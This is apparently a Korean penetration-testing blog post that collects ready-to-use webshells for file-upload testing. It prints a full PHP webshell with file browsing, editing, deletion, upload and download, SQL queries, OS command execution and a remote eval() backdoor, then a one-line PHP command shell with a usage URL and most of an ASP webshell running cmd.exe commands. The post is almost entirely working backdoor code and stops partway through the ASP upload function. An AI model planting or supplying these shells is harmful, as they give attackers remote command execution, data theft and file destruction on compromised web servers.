---
layout: post
title: ! "[Webshells] PHP, ASP, JSP WebShell 모음"
excerpt_separator: <!--more-->
comments : true
categories : [Pentesting/Web]
tags:
  - Web
  - pen-testing
  - Security
---

파일 업로드 테스트를 할 때 필요한 `WebShell` 코드들이다.  

필요할 때 바로 찾아쓸 수 있도록 테스트 해 보고 정리 해 둔다.  

<!--more-->

## Reference  

* [https://github.com/grCod/webshells/tree/master/webshells](https://github.com/grCod/webshells/tree/master/webshells)
* [https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp)

## 1. PHP  

테스트 환경은 다음과 같다.  
* Ubuntu 16.04
* Apache2

### Browsing WebShell  
```php
<?php

define("PASSWORD", "1a1dc91c907325c69271ddf0c944bc72");  //  Password ( md5 ) Default : pass 
define("STYLE", "dark");  // Shell style ( dark / light ) 


function os() { 
	return strtoupper(substr(PHP_OS, 0, 3));
}

function root_dir() { 
	return getcwd() . DIRECTORY_SEPARATOR;
}

function this_file() { 
	return (isset($_GET['file']) && file_exists($_GET['file'])) ? $_GET['file']:null;
}

function this_url() { 
	return "http://" . $_SERVER["HTTP_HOST"] . $_SERVER["PHP_SELF"];
}

function this_path() {
	if(!isset($_COOKIE["shell_path"]) || !is_dir($_COOKIE['shell_path']))  
		return root_dir();
	if(isset($_GET['path']) && is_dir($_GET['path'])) 
		return $_GET['path']; 
	return $_COOKIE["shell_path"]; 
}


class Shell {
	public function __construct() {
		$this->action = isset($_GET["act"])? $_GET["act"]:null;
		$this->setCookies();
	}
	
	public function login() {
		if(!$this->isAuthenticated()) {
			if(@md5($_POST["password"]) == PASSWORD) {
				setcookie("shell_pass", PASSWORD, time() + (60 * 60 * 24), "/");
				header("Location: " . this_url());
			} else {
				?>
				<html>
				<form method="POST">
					<input name="password" type="text" style="border:0px">
				</form>
				</html>
				<?php 
			}
			exit();
		}
	}
	
	public function logout() {
		if($this->action == "exit") {
			setcookie("shell_pass", null, time() - (60 * 60), "/");
			setcookie("shell_path", null, time() - (60 * 60), "/");
			setcookie("shell_sql", null, time() - (60 * 60), "/");
			header("Location: " . this_url()); 
		}
	}
	
	private function isAuthenticated() {
		if(!isset($_COOKIE["shell_pass"])) 
			return false; 
		if($_COOKIE["shell_pass"] != PASSWORD) 
			return false; 
		return true; 
	}
	
	private function setCookies() { 
		
		if(!isset($_COOKIE["shell_path"]) || !is_dir($_COOKIE['shell_path'])) 
			setcookie("shell_path", root_dir(), time() + (60 * 60 * 24), "/"); 
		elseif(isset($_GET['path']) && is_dir($_GET['path'])) 
			setcookie("shell_path", $_GET['path'], time() + (60 * 60 * 24), "/"); 
		if(!isset($_COOKIE["shell_sql"])) {
			$cookie = array("host", "user", "pass", "db", "dbms");  
		} else { 
			$values = unserialize($_COOKIE["shell_sql"]); 
			$cookie = array();
			$cookie[] = (isset($_POST['host']) && @$_POST['host'] != "")? $_POST['host']:$values[0];
			$cookie[] = (isset($_POST['user']) && @$_POST['user'] != "")? $_POST['user']:$values[1];
			$cookie[] = (isset($_POST['pass']) && @$_POST['pass'] != "")? $_POST['pass']:$values[2];
			$cookie[] = ((isset($_POST['db']) && @$_POST['db'] != "")? $_POST['db']:(isset($_GET['db']) ? $_GET['db']:$values[3]));
			$cookie[] = (isset($_POST['dbms']) && @$_POST['dbms'] != "")? $_POST['dbms']:$values[4]; 
		}
		setcookie("shell_sql", serialize($cookie), time() + (60 * 60 * 24), "/"); 
	}
	
	public function download() {
		if(isset($_POST["download"]) && $this->isAuthenticated()) 
			FileTransfer::downloader($_POST['path']);
	}
	
	public function info() {
		?>
		<table>
			<tr><th>OS: <?php echo @php_uname(); ?></th></tr>
		</table>
		<table>
			<tr><th>Server: <?php echo getenv('SERVER_SOFTWARE'); ?></th></tr>
		</table>
		<table>
			<tr>
				<th>Computer: <?php echo getenv('COMPUTERNAME'); ?></th>
				<th>Domain: <?php echo @php_uname('n'); ?></th>
				<th>User: <?php echo @get_current_user(); ?></th>
				<th>IP: <?php echo (getenv('LOCAL_ADDR') != null) ? getenv('LOCAL_ADDR') : getenv('SERVER_ADDR'); ?></th>
			</tr>
		</table>
		<?php 
	}
	
	public function actions() {
		if($this->action == "fbrowser") { 
			$fbrowser = new FileBrowser(this_path()); 
			$fbrowser->body();
		} elseif($this->action == "feditor") { 
			$feditor = new FileEditor((this_file() ? this_file():this_path())); 
			$feditor->actions();
			$feditor->body(); 
		} elseif($this->action == "fuploader") { 
			FileTransfer::uploader(this_path()); 
		} elseif($this->action == "cmd") { 
			Cmd::body(); 
		} elseif($this->action == "sql") { 
			$sql = new Database(); 
			$sql->query(); 
			$sql->body(); 
		} elseif($this->action == "exit") {
			$this->logout(); 
		}
	}
	
	public function remote() {
		function request($req) { 
			return isset($_GET[$req]) ? urldecode($_GET[$req]):base64_decode($_POST[$req]); 
		}
		if(isset($_REQUEST["remote"]) && @md5($_REQUEST["password"]) == PASSWORD) { 
			if(isset($_REQUEST["cmd"])) 
				Cmd::run(request("cmd"));
			elseif(isset($_REQUEST["php"])) 
				eval(request("php")); 
			elseif(isset($_REQUEST["info"])) 
				echo os().":".@get_current_user()."/".@gethostname().":".@getenv('SERVER_ADDR');
			exit();
		}
	}
}


class FileBrowser {
	public function __construct($path) {
		$this->path = $path;
	}
	
	public function body() {
		?>
		<table class="fbrowser">
			<tr style="<?php echo Css::style("tr"); ?>">
				<th>Cwd: <?php echo $this->cwd(); ?></th>
				<th class="menu" ><a href='?act=fbrowser&path=<?php echo root_dir(); ?>'>Home</a></th>
				<th>Drives: <?php echo $this->drives(); ?></th>
				<th></th>
				<th></th>
			</tr>
			<tr style="<?php echo Css::style("tr"); ?>">
				<th>Name</th><th>Size</th><th>Permissions</th><th>Created</th><th>Modified</th>
			</tr>
			<?php echo $this->dirsFiles(); ?>
		</table>
		<?php 
	}
	
	private function dirsFiles() {
		$fstr = "<tr><td><a href='?act=fbrowser&path=%s'>%s</a></td><td>%s</td><td>%s / %s</td><td>%s</td><td>%s</td></tr>";
		$dstr = "<tr><td><a href='?act=feditor&file=%s'>%s</a></td><td>%s</td><td>%s / %s</td><td>%s</td><td>%s</td></tr>";
		$dfl = $this->listDirsFiles();
		if($dfl == false) 
			return "<tr><th>Can't access: $this->path</th></tr>"; 
		$df_list = ""; 
		foreach($dfl[0] as $d) 
			$df_list .= sprintf($fstr, urlencode($d[1].DIRECTORY_SEPARATOR), $d[0].DIRECTORY_SEPARATOR, $d[2], $d[3], $d[4], $d[5], $d[6]);
		foreach($dfl[1] as $f) 
			$df_list .= sprintf($dstr, urlencode($f[1]), $f[0], $f[2], $f[3], $f[4], $f[5], $f[6]);
		return $df_list;
	}
	
	public function listDirsFiles() {
		$dirs = array();
		$files = array();
		if(($d_f = @scandir($this->path)) === false) 
			return false;
		foreach($d_f as $i) { 
			if($i != '.' && $i != '..') {
				$path = $this->path . $i; 
				if(is_dir($this->path . $i)) 
					$dirs[] = array(
						$i, $path, "Dir", 
						$this->getUidGid($path), $this->getPerms($path), 
						$this->getCMDate($path), $this->getCMDate($path, 9)
					); 
				if(is_file($this->path . $i)) 
					$files[] = array(
						$i, $path, $this->getSize($path), 
						$this->getUidGid($path), $this->getPerms($path), 
						$this->getCMDate($path), $this->getCMDate($path, 9)
					); 
			}
		} 
		return array($dirs, $files);
	}
	
	private function cwd() {
		$path = "";
		$parts = explode(DIRECTORY_SEPARATOR, $this->path);
		for($i=0; $i<count($parts)-1; $i++) {
			$path .= $parts[$i] . DIRECTORY_SEPARATOR;
			echo "<a href='?act=fbrowser&path=" . $path . "'>" . $parts[$i] . DIRECTORY_SEPARATOR . "</a>";
		}
	}
	
	private function drives() {
		foreach(range("A", "Z") as $drive) {
			if(@is_readable($drive . ":" . DIRECTORY_SEPARATOR)) 
				echo "<a href='?act=fbrowser&path=$drive:\\'>$drive:\\&nbsp;</a>"; 
			elseif(@is_dir($drive . ":" . DIRECTORY_SEPARATOR)) 
				echo "$drive:\\&nbsp;";
		}
	}
	
	private function getSize($path) {
		$stat = stat($path); 
		if($stat[7] > (1024*1024)) 
			return (int)($stat[7] / (1024*1024)) . " MB";
		elseif($stat[7] > 1024) 
			return (int)($stat[7] / 1024) . " KB";
		return $stat[7] . " B"; 
	}
	
	private function getPerms($path) {
		return substr(sprintf("%o", fileperms($path)), -4);
	}
	
	private function getUidGid($path) {
		$stat = stat($path); 
		return $stat[4] . ":" . $stat[5]; 
	}
	
	private function getCMDate($path, $d=10) {
		$stat = stat($path);
		return date("d/m/Y H:i", $stat[$d]); 
	}
}


class FileEditor  {
	public function __construct($path) {
		$this->path = isset($_POST['path'])? $_POST['path']:$path;
		$this->text = "";
		$this->message = "";
	}
	
	public function actions() { 
		if(isset($_POST["read"])) 
			$this->feRead();
		elseif(isset($_POST["write"])) 
			$this->feWrite($_POST['content']);
		elseif(isset($_POST["remove"])) 
			$this->message = $this->feRemove($this->path) ? "Deleted.":"Failed.";
		elseif(isset($_POST["rename"])) 
			$this->feRename(((this_file() == null) ? this_path():this_file())); 
		elseif(isset($_POST["mkdir"])) 
			$this->feMkdir(); 
	}
	
	public function body() { 
		?>
		<form method="POST">
			<input name="path" type="text" size="60" value="<?php echo $this->path; ?>">
			<input name="read" type="submit" value="read >>">
			<input name="write" type="submit" value="write >>">
			<input name="remove" type="submit" value="rmove >>">
			<input name="rename" type="submit" value="rname >>">
			<input name="mkdir" type="submit" value="mkdir >>">
			<input name="download" type="submit" value="dnload >>">
			&nbsp;&nbsp;<b><?php echo $this->message; ?></b>
			<pre class="sep"><textarea name="content"><?php echo $this->text; ?></textarea></pre>
		</form>
		<?php
	}
	
	private function feRead() {
		if(($data = @file_get_contents($this->path)) !== false) 
			$this->text = $this->isHtml($data) ? htmlspecialchars($data):$data; 
		else 
			$this->message = "Can't access file.";
	}
	
	private function feWrite($data) {
		$this->message = (@file_put_contents($this->path, $data) !== false) ? "Saved.":"Failed.";
	}
	
	private function feRemove($path) {
		if(!is_file($path) && !is_dir($path)) 
			return false; 
		if(is_file($path)) 
			return @unlink($path);
		if(($dir_content = @scandir($path)) === false) 
			return false; 
		foreach($dir_content as $d_f) 
			if($d_f != "." && $d_f != "..") 
				$this->feRemove($path . DIRECTORY_SEPARATOR . $d_f);
		return @rmdir($path);
	}
	
	private function feRename($new_path) {
		$this->message = (@rename($this->path, $new_path) !== false) ? "Renamed.":"Failed.";
	}
	
	private function feMkdir() {
		$this->message = (@mkdir($this->path) !== false) ? "Created.":"Failed.";
	}
	
	private function isHtml($data) {
		if(preg_match('/<html/im', $data, $m) || preg_match('/<body/im', $data, $m)) 
			return true;
		if(preg_match('/<form(.*?)form>/im', $data, $m) || preg_match('/<table(.*?)table>/im', $data, $m)) 
			return true;
		return false;
	}
}


class FileTransfer {
	public static function uploader($path) {
		?>
		<form method="POST", enctype="multipart/form-data">
			<input name="path" type="text" size="60" value="<?php echo $path; ?>">
			<input name="file" type="file">
			<input name="upload" type="submit" value=" >>">
		</form>
		<?php 
		if(isset($_POST["upload"])) { 
			$path = $_POST["path"] . basename($_FILES["file"]["name"]);
			if(move_uploaded_file($_FILES["file"]["tmp_name"], $path)) 
				echo "<b>File uploaded.</b>";
			else 
				echo "<b>Failed.<b>";
		}
	}
	
	public static function downloader($file) {
		header("Content-Disposition: attachment; filename=\"" . @basename($file) . "\"");
		header("Content-Length: \"" . @filesize($file) . "\"");
		header("Content-Type: application/octet-stream;");
		@readfile($file);
		exit();
	}
}


class Database {
	private $my_dbs = "SHOW DATABASES;"; 
	private $my_tbl = "SHOW TABLES;"; 
	private $ms_dbs = "SELECT name FROM master.dbo.sysdatabases"; 
	private $ms_tbl = "SELECT * FROM INFORMATION_SCHEMA.TABLES;"; 
	
	public function __construct() {
		$cookies = isset($_COOKIE["shell_sql"]) ? unserialize($_COOKIE["shell_sql"]):array("host", "user", "pass", "db", "dbms");
		$get_db = isset($_GET['db']) ? urldecode($_GET['db']):null; 
		$get_table = isset($_GET['table']) ? urldecode($_GET['table']):null; 
		$this->host = isset($_POST['host']) ? $_POST['host']:$cookies[0];
		$this->user = isset($_POST['user']) ? $_POST['user']:$cookies[1];
		$this->pass = isset($_POST['pass']) ? $_POST['pass']: $cookies[2];
		$this->db = (isset($get_db) ? $get_db : (isset($_POST['db']) ? $_POST['db']:$cookies[3]));
		$this->dbms = isset($_POST['dbms']) ? $_POST['dbms']:$cookies[4];
		$this->query = (isset($get_db) ? "SHOW TABLES;":(isset($get_table) ? "SELECT * FROM $get_table;":$this->my_dbs));
		if(isset($_POST["submit"])) 
			$this->query = ((@$_POST['query'] != "") ? $_POST['query']:($this->dbms == "mssql" ? $this->ms_dbs:$this->my_dbs));
		$this->output = ""; 
	}
	
	public function body() { 
		?>
		<form method="POST">
			<input name="host" type="text" size="12" value="<?php echo $this->host; ?>" onclick="cleanValue('host')">
			<input name="user" type="text" size="12" value="<?php echo $this->user; ?>" onclick="cleanValue('user')">
			<input name="pass" type="text" size="12" value="<?php echo $this->pass; ?>" onclick="cleanValue('pass')">
			<input name="db" type="text" size="12" value="<?php echo $this->db; ?>" onclick="cleanValue('db')">
			<input name="dbms" type="text" size="12" value="<?php echo $this->dbms; ?>" onclick="cleanValue('dbms')">
			<input name="query" type="text" size="60" value="<?php echo $this->query; ?>" onclick="cleanValue('query')">
			<input name="submit" type="submit" value=" >>">
		</form>
		<div class="sep">
			<?php echo $this->output; ?> 
		</div>
		<?php 
	}
	
	public function query() { 
		if(isset($_POST['submit']) || isset($_GET['db']) || isset($_GET['table'])) { 
			$dsn = "$this->dbms:host=$this->host; dbname=$this->db"; 
			try {
				@$conn = new PDO("$this->dbms:host=$this->host; dbname=$this->db", $this->user, $this->pass);
				@$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
				@$query = $conn->prepare($this->query);
				try { 
					@$query->execute();
					if(strtoupper(substr($this->query, 0, 6)) == "SELECT" || strtoupper(substr($this->query, 0, 4)) == "SHOW") 
						$this->read($query); 
					else  
						$this->output = "<b>Query executed.</b>";
				} catch(PDOException $e) { 
					$this->output = "<b>Query failed.</b>" . $e->getMessage();
				} 
			} catch(PDOException $e) { 
				$this->output = "<b>Connection failed: </b>" . $e->getMessage();
			}
			$conn = null; 
		}
	}
	
	private function read($query) {
		$this->output = "<table class='sql'>";
		$result = @$query->setFetchMode(PDO::FETCH_ASSOC); 
		foreach($query->fetchAll() as $id => $row) {
			if($id == 0) {
				$this->output .= "<tr>";
				foreach($row as $n => $v) 
					$this->output .= "<th>$n</th>";
				$this->output .= "</tr>";
			}
			$this->output .= "<tr>";
			foreach($row as $n => $v) { 
				if(strtoupper($n) == "DATABASE")  
					$this->output .= "<td><a href='?act=sql&db=" . urlencode($v) . "'>" . $v . "</a></td>";
				elseif(strtoupper(substr($n, 0, 5)) == "TABLE") 
					$this->output .= "<td><a href='?act=sql&table=" . urlencode($v) . "'>" . $v . "</a></td>";
				else 
					$this->output .= "<td>" . htmlspecialchars($v) . "</td>"; 
			}
			$this->output .= "</tr>";
		} 
		$this->output .= "</table>";
	}
}


class Cmd { 
	public static function body() { 
		?>
		<form method="POST">
			<input name="cmd" type="text" size="80" value="cmd_" onclick="cleanValue('cmd', 'any')">
			<input name="run" type="submit" value=" >>">
		</form>
		<?php 
		if(isset($_POST["run"])) {  
			$cmd = @$_POST["cmd"] . " 2>&1";
			echo "<pre>";
			Cmd::run($cmd); 
			echo "</pre>"; 
		}
	}

	public static function run($cmd) { 
		if(is_callable("system")) 
			system($cmd);
		elseif(is_callable("passthru")) 
			passthru($cmd);
		else  
			echo Cmd::output($cmd); 
	}

	public static function output($cmd) { 
		$output = "";
		if(is_callable("shell_exec")) { 
			$output = shell_exec($cmd);
		} elseif(is_callable("exec")) {
			exec($cmd, $out);
			foreach($out as $o) 
				$output .= $o . PHP_EOL;
		} elseif(is_callable("popen")) {
			if(($pop = popen($cmd, 'r')) !== false) {
				while(!feof($pop)) 
					$output .= fread($pop, 1024);
				pclose($pop);
			}
		} elseif(is_callable("proc_open")) { 
			$desc = array(0=>array("pipe", "r"), 1=>array("pipe", "w"), 2=>array("pipe", "w"));
			$proc = proc_open($cmd, $desc, $pipes);
			while(!feof($pipes[1])) 
				$output .= fread($pipes[1], 1024) ;
			fclose($pipes[1]);
			proc_close($proc);
		} else { 
			$output = "Failed."; 
		}
		return $output;
	}
}


class Css {
	public static function colors() { 
		if(STYLE == "dark") 
			$colors = array(
				"color"=>"#ddefff", "back"=>"#181818", 
				"link"=>"#ddefff", "visited"=>"#83c5ff", "hover"=>"#202020" 
			);
		else 
			$colors = array(
				"color"=>"#181818", "back"=>"#f0f8ff", 
				"link"=>"#015fb2", "visited"=>"#00437e", "hover"=>"#ddefff" 
			);
		return $colors;
	}

	public static function style($part="color") { 
		$colors = Css::colors();
		if($part == "body" || $part == "table" || $part == "tr" || $part == "th" || $part == "td") { 
			return sprintf(" color:%s; background-color:%s; ", $colors['color'], $colors['back']);
		} elseif($part == "input") { 
			if(STYLE == "dark") 
				return sprintf(" color:%s; background-color:%s; border:1px solid %s; ", $colors['back'], $colors['color'], $colors['visited']);
			else 
				return sprintf(" color:%s; background-color:%s; border:1px solid %s; ", $colors['hover'], "#242424", $colors['link']);
		} elseif($part == "hover") { 
			return sprintf(" color:%s; background-color:%s; ", $colors['color'], $colors['hover']);
		} else {
			return $colors;
		}
	}
}

?>
<?php $shell = new Shell(); ?>
<?php $shell->remote(); ?>
<?php $shell->login(); ?>
<?php $shell->logout(); ?>
<?php $shell->download(); ?>
<?php $colors = Css::colors(); ?>
<html>
<head>
	<title>Shell</title>
	<style>
		body { <?php echo Css::style("body"); ?> text-align:left; padding:2px; font-size:12px; }
		table { <?php echo Css::style("table"); ?> border-collapse:collapse; width:100%; padding:2px; font-size:12px; }
		th { font-size:13px; text-align:left; padding:2px; }
		td { font-size:12px; text-align:left; padding:2px; }
		table.fbrowser tr { <?php echo Css::style("tr"); ?> }
		table.fbrowser tr:hover { <?php echo Css::style("hover"); ?> } 
		.sql { border:1px solid <?php echo $colors['color']; ?>; <?php echo Css::style("table"); ?> width:100%; padding:2px; font-size:12px;}
		.sql th { <?php echo Css::style("th"); ?>  border:1px solid <?php echo $colors['color']; ?>;}
		.sql td { font-size:12px; text-align:left; padding:2px; } 
		.sql tr { <?php echo Css::style("tr"); ?> }
		.sql tr:hover { <?php echo Css::style("hover"); ?> }
		input { <?php echo Css::style("input"); ?> font-size:12px; padding:2px; }
		textarea { width:100%; height:100%; }
		div { padding:2px; }
		.sep { padding:0px; }
		a:link { color:<?php echo $colors['link']; ?>; }
		a:visited { color:<?php echo $colors['visited']; ?>; }
		.menu { text-align:left; padding:2px; font-size:13px; }
		.menu a { color:<?php echo $colors['color']; ?>; text-decoration:none; }
	</style>
	<script>
	function cleanValue(name, value="") {
		if(
			document.getElementsByName(name)[0].value == name 
			|| document.getElementsByName(name)[0].value == value
			|| value == "any"
		)
			document.getElementsByName(name)[0].value = "";
	}
	</script>
</head>
<body>
<div>
	<?php $shell->info(); ?>
</div>
<div>
	<hr>
	<table class="menu"> 
		<tr>
			<th><a href="?act=fbrowser">FileBrowser</a></th>
			<th><a href="?act=feditor">FileEditor</a></th>
			<th><a href="?act=fuploader">FileUploader</a></th>
			<th><a href="?act=cmd">RunCmd</a></th>
			<th><a href="?act=sql">SqlQueries</a></th>
			<th><a href="?act=exit">Exit</a></th>
		</tr>
	</table>
	<hr>
</div>
<div>
	<?php $shell->actions(); ?>
</div>
</body>
</html>
```

### One Line WebShell  
```php
<?php echo passthru($_GET['cmd']); ?>

// Usage : http://example.com?filename.php?cmd=ls
```

## 2. ASP  

테스트 환경은 다음과 같다.  
* Windows Server 2019
* IIS

### Browsing WebShell  
```asp
<% @language = "VBScript" %>
<%
on error resume next
dim fso, wshell, wnet 
dim fpath, i, folder, list
dim FileName, ContentType, Value
dim shell, password, style, this_url, root_path
set fso = CreateObject("Scripting.FileSystemObject")
set wshell = CreateObject("WScript.Shell")
set wnet = Server.CreateObject("WScript.Network")
root_path = fso.GetFolder(Server.MapPath("\")) & "\"
this_url = Request.ServerVariables("URL")
Server.ScriptTimeout = 120
Session.Timeout = 60
password = "pass"  ' password 
style = "light"    ' style
sub Echo(line) 
	response.write line
end sub
function S_GET(get_request)
	S_GET = Request.QueryString(get_request)
end function
function S_POST(post_request) 
	S_POST = Request.Form(post_request)
end function
function this_path()
	if len(trim(S_GET("path"))) <> 0 and fso.FolderExists(trim(S_GET("path"))) then
		Response.Cookies("shell_path") = trim(S_GET("path")) 
		this_path = trim(S_GET("path"))
	elseif len(Request.Cookies("shell_path")) = 0 or not fso.FolderExists(Request.Cookies("shell_path")) then 
		Response.Cookies("shell_path") = root_path
		this_path = root_path
	else 
		this_path = Request.Cookies("shell_path")
	end if
end function
function Action() 
	if len(S_POST("download")) > 0 then 
		action = "download"
	elseif S_POST("sql") > 0 then 
		action = "sql"
	elseif S_GET("act") <> "" then 
		action = trim(S_GET("act"))
	else 
		action = ""
	end if 
end function
sub Login()
	if Request.Cookies("shell_login") = password then exit sub
	%>
	<html><form method="POST"><input name="password" style="border:0px"><form>
	<%
	if S_POST("password") = password then 
		Response.Cookies("shell_login") = password
		Response.Redirect this_url
	else 
		Response.End
	end if 
end sub
sub Logout()
	Response.Cookies("shell_login") = ""
	Response.Cookies("shell_path") = ""
	Response.Cookies("shell_sql") = ""
	Response.Redirect this_url
	Response.End
end sub
sub Downloader(filepath)
	dim downfile, stream 
	
	Set downfile = fso.GetFile(filepath)
	set stream = Server.CreateObject("ADODB.Stream")
	Response.AddHeader "Content-Disposition", "attachment; filename=" & downfile.Name  
	Response.ContentType = "application/octet-stream"
	Response.Charset = "UTF-8"
	stream.Open
	stream.Type = 1
	stream.LoadFromFile(downfile.Path)
	Response.BinaryWrite(stream.Read)
	stream.Close
	Response.End
	
	set stream = Nothing
	set downfile = Nothing
end sub
sub FileBrowser(path)
	%>
	<table class="fbrowser"> 
		<tr style="<% echo colors("tr") %>">
			<th>CWD: <% GetCwd(this_path) %></th>
			<th class="menu" ><a href="<% = this_url %>?act=fbrowser&path=<% = root_path %>">Home</a></th>
			<th>Drives: <% Locations() %></th>
			<th></th>
			<th></th>
		</tr>
		<tr style="<% echo colors("tr") %>">
			<th align="left">Name</th><th>Size</th><th>Permissions</th><th>Modified</th><th>Accessed</th><th>Created</th>
		</tr>
	<%
	set folder = fso.GetFolder(path)
	if not folder.IsRootFolder then
		%>
		<tr style="<% echo colors("tr") %>">
			<td><a href="<% echo this_url %>?&act=fbrowser&path=<% Server.URLEncode(folder.ParentFolder.Path) %>\">..</a></td>
		</tr>
		<%
	end if
	set list = folder.SubFolders
	for each i in list
		%>
		<tr>
			<td><a href="<% echo this_url %>?act=fbrowser&path=<% echo Server.URLEncode(i.Path) %>\"><% echo i.Name %>\</a></td>
			<td>Folder</td>
			<td><% echo getAttr(i.Attributes) %></td>
			<td><% echo DateFormat(i.DateLastModified) %></td>
			<td><% echo DateFormat(i.DateLastAccessed) %></td>
			<td><% echo DateFormat(i.DateCreated) %></td>
		</tr>
		<%
	next
	set list = folder.Files
	for each i in list
	    %>
		<tr>
			<td><a href="<% echo this_url %>?act=feditor&path=<% echo trim(S_GET("path")) %>&file=<% echo Server.URLEncode(i.Path) %>"><% echo i.Name %></a></td>
			<td><% echo FormatNumber(i.Size, 0) %></td>
			<td><% echo getAttr(i.Attributes) %></td>
			<td><% echo DateFormat(i.DateLastModified) %></td>
			<td><% echo DateFormat(i.DateLastAccessed) %></td>
			<td><% echo dateFormat(i.DateCreated) %></td>
		</tr>
		<%
	next
	
	set list = Nothing
	set folder = Nothing
	%></table><%
end sub
function getAttr(attr)
	if attr = 0 or attr = 2 or attr = 4 or attr = 32 then 
		getAttr = "read/write"
	elseif attr = 1 or attr = 8 or attr = 16 or attr = 64 or attr = 1024 or attr = 2048 then 
		getAttr = "read"
	else 
		getAttr = """" & attr & """"
	end if
end function 
function DateFormat(d) 
	DateFormat = FormatDateTime(d, 2) & " " & FormatDateTime(d, 4)
end function
sub GetCwd(path)
	dim temppath : temppath = ""
	set folder = fso.GetFolder(path)
	list = split(folder.path, "\")
	for each i in list
		temppath = temppath & i & "\"
		echo "<a href=" & this_url & "?act=fbrowser&path=" & Server.URLEncode(temppath) & ">" & i & "\</a>"
	next
	set folder = Nothing
end sub
sub Locations()
	for each i in fso.Drives
		if i.IsReady then
			echo "<a href=" & this_url & "?act=fbrowser&path=" & i.DriveLetter & ":\>" & i.DriveLetter & ":\</a>&nbsp;&nbsp;"
		else 
			echo i.DriveLetter & ":\&nbsp;&nbsp;"
		end if
	next
end sub
sub FileEditor(fpath)
	Dim content, data, message, f	
	
	content = ""
	message = ""
	if trim(S_POST("fpath")) <> "" then fpath = trim(S_POST("fpath"))
	
	if (len(S_POST("read")) > 0)  then 
		if fso.FileExists(fpath) then 
			set f = fso.OpenTextFile(fpath, 1)
		
			content = Server.HTMLEncode(f.readall)
			f.close
			set f = Nothing
		else 
			message = "Can't access file."
		end if
	elseif len(S_POST("write")) > 0 then 
		if fso.FolderExists(fpath) then 
			message = "Use mkdir."
		else 
			set f = fso.OpenTextFile(fpath, 2, 2)
			
			message = "Failed." 
			data = Request.Form("content")
			f.write(data) 
			if err.number = 0 then message = "File saved." 
			f.close
			set f = nothing
		end if
	elseif len(S_POST("delete")) > 0 then
		message = "Failed."
		if fso.FileExists(fpath) then  
			fso.deleteFile(fpath) 
			if err.number = 0 then message = "File removed."
		elseif fso.FolderExists(fpath) then 
			fso.DeleteFolder(fpath)
			if err.number = 0 then message = "Dir Removed." 
		end if 
 	elseif len(S_POST("rename")) > 0 then 
		message = "Failed." 
		if fso.FileExists(S_GET("file")) then 
			fso.MoveFile S_GET("file"), fpath 
			if err.number = 0 then message = "Renamed." 
		end if 
	elseif len(S_POST("folder")) > 0 then
		message = "Failed." 
		fso.CreateFolder(fpath) 
		if err.number = 0 then message = "Created."
	end if
	%>
	<form method="POST" name="editor">
		<Input size="60" type="text" name="fpath" value="<% echo fpath %>" />
		<input type="submit" name="read" value="read >>" />
		<input type="submit" name="write" value="write >>" />
		<input type="submit" name="delete" value="rmove >>" />
		<input type="submit" name="rename" value="rname >>" />
		<input type="submit" name="download" value="dnload >>" />
		<input type="submit" name="folder" value="mkdir >>" />
		&nbsp;&nbsp;<b><% echo message %></b>
		<br>
		<pre><textarea name='content'><% echo content %></textarea></pre>
	</form> 
	<%
end sub
sub RunCmd()
	%>
	<form method="POST" name="shell">
		<Input size="80" type="text" name="cmd" value="cmd_" />
		<input type="submit" name="submit" value=">>" />
	</form>
	<%
	dim objCmd, cmd, cmd_result 
	if len(S_POST("submit")) > 0 then
		cmd = "%comspec% /c " & trim(S_POST("cmd"))
		set objCmd = wshell.Exec(cmd)
		cmd_result = objCmd.StdOut.Readall() & objCmd.StdErr.ReadAll()
		echo "<pre>" & replace(cmd_result, vbCrLf, "<br>") & "</pre>"
		set objCmd = nothing
	end if
end sub
sub Database()
	Dim objCn, objRS, i, qry, sqlExec, host, user, pass, db, dbms 
	
	host = dbValues("host")
	user = dbValues("user")
	pass = dbValues("pass")
	db = dbValues("db")
	dbms = dbValues("dbms")
	
	if S_GET("qry") <> "" then qry = trim(S_GET("qry"))
	if len(S_POST("submit")) > 0 then qry = S_POST("qry")
	if qry = "" then qry = "SELECT * FROM INFORMATION_SCHEMA.TABLES;"
	%>
	<form method="POST" name="sql">
		<Input size="12" type="text" name="host" value="<% echo host %>" />
		<Input size="12" type="text" name="user" value="<% echo user %>" />
		<Input size="12" type="text" name="pass" value="<% echo pass %>" />
		<Input size="12" type="text" name="db" value="<% echo db %>" />
		<Input size="12" type="text" name="dbms" value="<% echo dbms %>" />
		<Input size="60" type="text" name="qry" value="" />
		<input type="submit" name="submit" value=">>" />
	</form>
	<%
	if len(S_POST("submit")) = 0 and len(S_GET("qry")) = 0 then exit sub
	
	Set objCn = Server.CreateObject("ADODB.Connection")
	objCn.ConnectionString = "DRIVER={SQL Server}; server=" & host & "; uid=" & user & "; pwd=" & pass & "; DATABASE=" & db & ";"
	objCn.Open
	set sqlExec = objCn.Execute(qry)
	
	if InStr(ucase(trim(qry)), "SELECT") <> 1 and InStr(ucase(trim(qry)), "SHOW") <> 1 then 
		echo "<b> Query submited. </b>"
		exit sub 
	end if
	
	echo "<table class='sql'>"
	echo "<tr>"
	for each i in sqlExec.Fields
		echo "<th>" & i.name & "</th>"
	next 
	echo "</tr>"
	
	sqlExec.MoveFirst
	do while not sqlExec.EOF
		echo "<tr>"
		for each i in sqlExec.Fields
			if i.name = "TABLE_NAME" then 
				echo "<td><a href='" & this_url & "?act=sql&qry=" & Server.URLEncode("SELECT * FROM " & i.value) & "'>" & i.value & "</a></td>"
			else 
				echo "<td>" & i.value & "</td>"
			end if 
		next
		sqlExec.MoveNext
		echo "</tr>"
	loop
	echo "<table></div>"
	
	sqlExec.Close
	objCn.Close
	set sqlExec = Nothing
	Set objCn = Nothing
end sub
function dbValues(value) 
	if trim(S_POST(value)) <> "" and S_POST("host") <> "host" then 
		Response.Cookies("shell_sql")(value) = S_POST(value)
		dbValues = S_POST(value)
	elseif len(Request.Cookies("shell_sql")(value)) > 0 then 
		dbValues = Request.Cookies("shell_sql")(value)
	else 
		dbValues = value
	end if
end function 
Function BuildUpload(RequestBin)
	dim PosBeg, PosEnd, boundary, boundaryPos, UploadControl, Pos, Name, PosFile, PosBound 
	'Get the boundary
	PosBeg = 1
	PosEnd = InstrB(PosBeg, RequestBin, getByteString(chr(13)))
	boundary = MidB(RequestBin, PosBeg, PosEnd-PosBeg)
	boundaryPos = InstrB(1, RequestBin, boundary)
	'Get all data inside the boundaries
